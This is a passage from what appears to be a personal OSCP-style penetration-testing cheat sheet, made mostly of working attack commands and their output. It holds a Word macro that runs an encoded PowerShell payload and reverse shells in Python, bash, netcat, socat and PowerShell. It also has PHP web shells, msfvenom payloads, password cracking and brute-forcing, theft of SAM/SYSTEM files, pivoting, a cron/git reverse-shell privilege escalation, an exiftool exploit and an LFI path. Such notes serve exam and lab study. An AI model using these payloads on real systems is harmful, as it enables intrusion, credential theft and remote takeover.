ACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
````
````
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
````
### Coding RCEs

#### Python
````
import subprocess

# Replace "<your $IP" and "<your $PORT>" with your target IP address and port
reverse_shell_command = 'python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<your $IP>',<your $PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"'

try:
    # Execute the reverse shell command
    subprocess.run(reverse_shell_command, shell=True)
except Exception as e:
    print(f"An error occurred: {e}")
````
#### Bash

````
#!/bin/bash

sh -i 5<> /dev/tcp/[MY_IP]/[MY_PORT] 0<&5 1>&5 2>&5
````

### Linux rce techniques
````
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
python3 -m http.server
nc -nlvp 443
<?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
````
````
echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
shell.php&cmd=
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
or

busybox nc $IP 5000 -e /bin/bash
````
````
 &cmd=whoami or ?cmd=whoami
<?php shell_exec($_GET["cmd"]);?>
<?php system($_GET["cmd"]);?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
````
````
cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 800
nc -nlvp 443
&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
````
#### Reverse Shell Payload
````
https://revshells.com/
````
### Hashing & Cracking
#### Wordlists that worked
````
/usr/share/wordlists/rockyou.txt
/usr/share/wfuzz/wordlist/others/common_pass.txt
````
#### Enumeration
````
hashid <paste your hash here>
````
````
https://www.onlinehashcrack.com/hash-identification.php
````
````
https://hashcat.net/wiki/doku.php?id=example_hashes
````
#### Cracking hashes
````
https://crackstation.net/
````
````
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
##### Md5
````
hashcat -m 0 -a 0 -o hashout eric.hash /home/jerm/rockyou.txt #if the original doesnt work use this
````
##### Cracking with Johntheripper
````
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
````
##### Crakcing with hydra
###### ssh
````
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt $IP -t 4 ssh
hydra -l userc -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
````
#### Cracking kdbx files
````
keepass2john Database.kdbx > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
````
#### KeePass.dmp
````
sudo git clone https://github.com/CMEPW/keepass-dump-masterkey
chmod +x poc.py

python3 poc.py -d /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp 
2023-09-27 20:32:29,743 [.] [main] Opened /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
````
#### Downloading keepassxc
````
sudo apt update && sudo apt-get install keepassxc
````

![image](https://github.com/xsudoxx/OSCP/assets/127046919/7aa67384-ba6b-4a94-b522-99349a987e3d)

![image](https://github.com/xsudoxx/OSCP/assets/127046919/1b97a744-63ab-4264-b3b3-e32485edfceb)


#### Cracking Zip files
````
unzip <file>
unzip bank-account.zip 
Archive:  bank-account.zip
[bank-account.zip] bank-account.xls password: 
````
````
zip2john file.zip > test.hash
john --wordlist=/usr/share/wordlists/rockyou.txt test.hash
````
#### Cracking with CyberChef
````
https://gchq.github.io/CyberChef/
````
##### hashcat output
If hashcat gives back some sort of Hex Encoding you can use cyber chef to finish off the hash and give you back the password
````
$HEX[7261626269743a29]
````
![image](https://github.com/xsudoxx/OSCP/assets/127046919/88bc13a2-ec53-4a91-8ce1-c484fde12886)

#### Testing for passwords
##### Background
````
We typically know we can unzip files and get de-compress the results, in this case we unzipped the zip file and got almost nothing back it was weird, we used instead the commands below to test for a password on the zip file and it did indeed prompt us to enter a zip file password, we used our cracking technique of hashes above was able to login with su chloe with the password we found in the file
````
````
sudo 7z x sitebackup3.zip
````
````
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD Ryzen 5 5500U with Radeon Graphics          (860F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 25312 bytes (25 KiB)

Extracting archive: sitebackup3.zip
--
Path = sitebackup3.zip
Type = zip
Physical Size = 25312

    
Enter password (will not be echoed):
Everything is Ok         

Folders: 17
Files: 19
Size:       67063
Compressed: 25312
````
### Logging in/Changing users
#### rdp
````
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be22022754bf0975251e1e7ac
````
## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />

## MSFVENOM
### MSFVENOM Cheatsheet
````
https://github.com/frizb/MSF-Venom-Cheatsheet
````
### Linux 64 bit PHP
````
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf > shell.php
````
### Windows 64 bit
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=<port you designated> -f exe -o ~/shell.exe
````
### Windows 64 bit apache tomcat
````
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=80 -f raw > shell.jsp
````
### Windows 64 bit aspx
````
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -o shell64.aspx
````
### Apache Tomcat War file
````
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
````
### Javascript shellcode
````
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le -o shellcode
````
## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
### Powershell Linux to Windows
````
(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')
````
### SMB Linux to Windows
````
impacket-smbserver -smb2support Share .
cmd.exe /c //<your kali IP>/Share/<file name you want>
````
````
/usr/local/bin/smbserver.py -username df -password df share . -smb2support
net use \\<your kali IP>\share /u:df df
copy \\<your kali IP>\share\<file wanted>
````
````
impacket-smbserver -smb2support Share .
net use \\<your kali IP>\share
copy \\<your kali IP>\share\whoami.exe
````
### Windows http server Linux to Windows
````
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
````
````
Invoke-WebRequest -Uri http://10.10.93.141:7781/winPEASx64.exe -OutFile wp.exe
````
#### Errors
````
Access is denied. In this case try Invoke-WebRequest for powershell
````
### SMB Shares Windows to Windows
````
In this situation we have logged onto computer A
sudo impacket-psexec Admin:'password123'@192.168.203.141 cmd.exe
C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.203.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.203.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.93.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   
 Via Computer A we pivot to Computer B (internal IP) with these creds
 proxychains evil-winrm -u celia.almeda -p 7k8XHk3dMtmpnC7 -i 10.10.93.142
````
#### Accessing $C Drive of Computer A
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin password123
````
#### Copying over files
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SYSTEM Z:\
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SAM Z:\
````
### SMB Server Bi-directional
````
impacket-smbserver -smb2support Share .
smbserver.py -smb2support Share .
mkdir loot #transfering loot to this folder
net use * \\192.168.119.183\share
copy Z:\<file you want from kali>
copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
````
#### Authenticated
````
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
````
````
impacket-smbserver -username df -password df share . -smb2support
net use \\10.10.16.9\share /u:df df
copy \\10.10.16.9\share\<file wanted>
````

### PHP Script Windows to Linux
````
cat upload.php
chmod +x upload.php
````
````
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
````
````
sudo mkdir /var/www/uploads
````
````
mv upload.php /var/www/uploads
````
````
service apache2 start
ps -ef | grep apache
`````
````
powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
````
````
service apache2 stop
````

## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />
### Use this guide first
````
https://sirensecurity.io/blog/linux-privilege-escalation-resources/
````
### Checking interesting folders
````
/opt #lead us to chloe which lead us to root
````
### Finding Writable Directories
````
find / -type d -writable -user $(whoami) 2>/dev/null
````
### Finding SUID Binaries
````
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
find / -perm /4000 2>/dev/null
````
### start-stop-daemon
````
/usr/sbin/start-stop-daemon
````
````
/usr/sbin/start-stop-daemon -n foo -S -x /bin/sh -- -p
````
### Crontab 
````
cat /etc/crontab
````
### NFS
````
cat /etc/exports
````
## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />
### PowerUp.ps1
````
cp /opt/PowerUp/PowerUp.ps1 .
Import-Module .\PowerUp.ps1
. .\PowerUp.ps1
````
### Windows Binaries
````
sudo apt install windows-binaries
````
### Basic Enumeration of the System
````
# Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
````
````
dir /a-r-d /s /b
move "C:\Inetpub\wwwroot\winPEASx86.exe" "C:\Directory\thatisWritable\winPEASx86.exe"
````
#### Windows Services - insecure file persmissions
````
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command refer to exploits below
````
### Clear text passwords
````
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
````
````
dir /s /p proof.txt
dir /s /p local.txt
````
### Git commands
````
C:\Users\damon> type .gitconfig
[safe]
        directory = C:/prod
[user]
        email = damian
        name = damian
````
````
C:\Users\damon> cd C:/prod
````
````
C:\prod> git log
fatal: detected dubious ownership in repository at 'C:/prod'
'C:/prod/.git' is owned by:
        'S-1-5-21-464543310-226837244-3834982083-1003'
but the current user is:
        'S-1-5-18'
To add an exception for this directory, call:

        git config --global --add safe.directory C:/prod
````
````
C:\prod> git config --global --add safe.directory C:/prod
````
````
C:\prod> git log
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

commit 967fa71c359fffcbeb7e2b72b27a321612e3ad11
Author: damian <damian>
Date:   Thu Oct 20 02:06:37 2022 -0700

    V1
````
````
C:\prod> git show
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@example.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@example.com as he is responsible for the mail server. 
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file
````
### Powershell password hunting
#### Viewing Powershell History
````
PS C:\> (Get-PSReadlineOption).HistorySavePath
C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
````
#### Interesting Files
````
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\passwords.txt

Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
cat Desktop\asdf.txt
````
## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
### Linux
#### Pimp my shell
````
which python
which python2
which python3
python -c ‘import pty; pty.spawn(“/bin/bash”)’
````
````
which socat
socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
````
````
Command 'ls' is available in '/bin/ls'
export PATH=$PATH:/bin
````
````
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
export PATH=$PATH:/usr/bin
````
````
-rbash: $'\r': command not found
BASH_CMDS[a]=/bin/sh;a
````
````
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
````
#### Reverse shells
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
````
````
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 #worked
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' #worked
````
### Windows
#### Stable shell
````
nc -nlvp 9001
.\nc.exe <your kali IP> 9001 -e cmd
C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe
````
#### Powershell
````
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444" >> Invoke-PowerShellTcp.ps1
powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victim run this
````
## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
````
https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/pivoting-basics/
````
### Commands
````
ps aux | grep ssh
kill (enter pid #)
````
### Tools
#### sshuttle
##### Linux Enviorment
````
sshuttle -r USERS@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traffic into the IT Network
#In this situation we have rooted a linux machine got user creds and can establish an sshuttle
#You can visit the next network as normal and enumerate it as normal.
#best used for everything else but nmap
````
###### Transfering files via sshuttle
````
sshuttle -r USERS@10.11.1.251 10.1.1.0/24 #1 Port Foward to our machine
python3 -m http.server 800 # on our kali machine
ssh userc@10.1.1.27 curl http://192.168.119.140:800/linpeas.sh -o /tmp/linpeas.sh #2 on our kali machine to dowload files
````
#### ssh port foward
##### Linux Enviorment
````
sudo echo "socks4 127.0.0.1 80" >> /etc/proxychains.conf 
[7:06 PM]
ssh -NfD 80 USERS@10.11.1.251 10.1.1.0/24
[7:07 PM]
proxychains nmap -p- --min-rate=1000 10.1.1.27 -Pn #best used for nmap only
proxychains nmap -sT --top-ports 1000 --min-rate=1000 -Pn  10.1.1.68 -v # better scan
proxychains nmap -A -sT -p445 -Pn 10.1.1.68 # direct scans of ports this is best used when enumerating each port
````
#### ssh Local port fowarding
##### Info 
````
In local port forwarding, you are forwarding a port on your local machine to a remote machine. This means that when you connect to a remote server using SSH and set up local port forwarding, any traffic sent to the specified local port will be forwarded over the SSH connection to the remote machine and then forwarded to the target service or application.
````
##### Example
````
ssh -L 6070:127.0.0.1:2049 userc@10.1.1.27 -N
````
````
This command creates an SSH tunnel between your local computer and a remote computer at IP address 10.1.1.27, with the user "userc". The tunnel forwards all traffic sent to port 6070 on your local computer to port 2049 on the remote computer, which is only accessible via localhost (127.0.0.1). The "-N" flag tells SSH to not execute any commands after establishing the connection, so it will just stay open and forward traffic until you manually terminate it. This is commonly used for securely accessing network services that are not directly accessible outside of a certain network or firewall.

#notes we did not use proxychains on this. just as the setup was above
````
##### Example #2
````
Lets say you have compromised host 192.168.236.147 which has access to 10.10.126.148, you could access the mssql server on port 1433 locally by doing a local port forward as seen below. This will essence allow you to access to the mssql port on your local machine with out needing proxychains.
````
````
ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
````
````
sqsh -S 127.0.0.1 -U example.com\\sql_service -P password123 -D msdb
````
#### Bi-directional ssh tunnel
````
In this example we are 192.168.45.191 attacking an AD exploit chain with internal/private IPs. We are able to get sql_service creds on MS01 which can be used to login into MS02, once we login we cannot download any files or do any rce's so we have to setup a bi-directional ssh tunnel.
````
##### arp -a
````
 sudo impacket-psexec Admin:password123@192.168.236.147 cmd.exe
````
````
We are using the arp -a on MS01 to show where we got some of the IPs, internal and external facing when going through this exploit chain.
````
````
C:\Windows\system32> arp -a
 
Interface: 192.168.236.147 --- 0x6
  Internet Address      Physical Address      Type   
  192.168.236.254       00-50-56-bf-dd-5e     dynamic   
  192.168.236.255       ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static    

Interface: 10.10.126.147 --- 0x8
  Internet Address      Physical Address      Type
  10.10.126.146         00-50-56-bf-27-a8     dynamic
  10.10.126.148         00-50-56-bf-f9-55     dynamic
  10.10.126.255         ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static
````
##### Local Port Foward
````
Sets up local port forwarding. It instructs SSH to listen on port 1433 on the local machine and forward any incoming traffic to the destination IP address 10.10.126.148 on port 1433. Admin@192.168.236.147: Specifies the username (Admin) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
````
````
ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
````
````
In our next command we are able to login as the sql_service on 10.10.126.148 (MS02) as if we were 192.168.236.147 (MS01)
````
````
sqsh -S 127.0.0.1 -U example.com\\sql_service -P password123 -D msdb
````
##### Reverse Port Foward
````
-R 10.10.126.147:7781:192.168.45.191:18890: Sets up reverse port forwarding. It instructs SSH to listen on IP 10.10.126.147 and port 7781 on the remote server, and any incoming traffic received on this port should be forwarded to the IP 192.168.45.191 and port 18890.
Admin@192.168.236.147: Specifies the username (Admin) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
````
````
sudo ssh -R 10.10.126.147:7781:192.168.45.191:18890 Admin@192.168.236.147 -N
````
##### RCE
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.126.147 LPORT=7781 EXITFUNC=thread -f exe --platform windows -o rshell.exe
````
````
1> xp_cmdshell 'whoami'
nt service\mssql$sqlexpress
````
````
1> xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
````
````
python3 -m http.server 18890
Serving HTTP on 0.0.0.0 port 18890 (http://0.0.0.0:18890/) ...
192.168.45.191 - - [30/May/2023 22:05:32] "GET /rshell.exe HTTP/1.1" 200 -
````
````
1> xp_cmdshell 'c:\Users\Public\reverse.exe"'
````
````
nc -nlvp 18890
retrying local 0.0.0.0:18890 : Address already in use
retrying local 0.0.0.0:18890 : Address already in use
listening on [any] 18890 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.45.191] 37446
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssql$sqlexpress
````
#### Chisel
````
https://github.com/jpillora/chisel/releases/ #where you can find newer versions
````
##### Chisel Windows
````
https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_386.gz #Windows Client
cp /home/kali/Downloads/chisel_1.8.1_windows_386.gz .
gunzip -d *.gz
chmod +x chisel_1.8.1_windows_386
mv chisel_1.8.1_windows_386 chisel.exe
````
##### Chisel Nix
````
locate chisel
/usr/bin/chisel #Linux Server
````
###### Windows to Nix
````
chisel server --port 8000 --socks5 --reverse #On your kali machine
vim /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 8080
socks5 127.0.0.1 1080
certutil -urlcache -split -f http://<your $IP>:<Your Porty>/chisel.exe
.\chisel client <your IP>:8000 R:socks #On victim machine
proxychains psexec.py victim:password@<victim $IP> cmd.exe
````

## Compiling Exploit Codes <img src="https://cdn-icons-png.flaticon.com/128/868/868786.png" width="40" height="40" />
### Old exploits .c
````
sudo apt-get install gcc-multilib
sudo apt-get install libx11-dev:i386 libx11-dev
gcc 624.c -m32 -o exploit
````
## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
### Crontab/Git
In this priv esc scenario we logged in via ssg, found that a cron job was running bash file with root privs. We could git clone that same repo with the private key we find in user gits ssh folder and edit the bash file to give us a rce as root.
````
/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Jan 23 10:34 cron.daily
-rw------- 1 root root    9 May 28 02:19 cron.monthly
-rw------- 1 root root    9 May 28 02:19 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
````
````
-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
````
#### Setup
````
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.214.125:/git-server
````
````
cd git-server
cat backups.sh 
#!/bin/bash
#
#
# # Placeholder
#

````
````
cat backups.sh 
#!/bin/bash
sh -i >& /dev/tcp/192.168.45.191/18030 0>&1
````
````
chmod +x backups.sh
````
````
GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git status            
On branch master
Your branch is up to date with 'origin/master'.

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        modified:   backups.sh

no changes added to commit (use "git add" and/or "git commit -a")
````
#### Git setup / exploit
````
git config --global user.name "git"
git config --global user.email "git@userD" #User is the same from the private key git@
````
````
GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git add --all
IT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git commit -m "PE Commit"

[master 872aa26] Commit message
 1 file changed, 1 insertion(+), 4 deletions(-)
 
 GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git push origin master        
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 3 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 294 bytes | 147.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.214.125:/git-server
   b50f4e5..872aa26  master -> master
````
````
nc -nlvp 18030                                   
listening on [any] 18030 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.125] 48038
sh: cannot set terminal process group (15929): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.0# id
id
uid=0(root) gid=0(root) groups=0(root)
sh-5.0# 
````
### Exiftool priv esc
````
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
````
````
www-data@exfiltrated:/opt$ cat image-exif.sh
cat image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
````
#### Setup
````
sudo apt-get install -y djvulibre-bin
wget -qO sample.jpg placekitten.com/200
file sample.jpg
printf 'P1 1 1 1' > input.pbm
cjb2 input.pbm mask.djvu
djvumake exploit.djvu Sjbz=mask.djvu
echo -e '(metadata (copyright "\\\n" . `chmod +s /bin/bash` #"))' > input.txt
djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
````
#### Exploit
````
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.191:80/exploit.jpg
````
````
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
````
````
www-data@exfiltrated:/var/www/html/subrion/uploads$ /bin/bash -p
/bin/bash -p
bash-5.0# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
````
### Monitor processes/cron jobs
#### pspy
````
https://github.com/DominicBreuker/pspy
````
````
/opt/pspy/pspy64 #transfer over to victim
````
````
chmod +x pspy64
./pspy64 -pf -i 1000
````

### Active Ports
````
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp   LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*                                                                                                                                                                                
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      511        127.0.0.1:8000      0.0.0.0:*          
tcp   LISTEN 0      128             [::]:2222         [::]:*          
tcp   LISTEN 0      511                *:80              *:*          
tcp   LISTEN 0      511                *:443             *:*
````
#### Local Port Foward
````
ssh -i id_ecdsa userE@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
````
#### Curl
````
curl 127.0.0.1:8000
````
#### LFI
````
127.0.0.1:8000/backend/?view=../../../../../etc/passwd
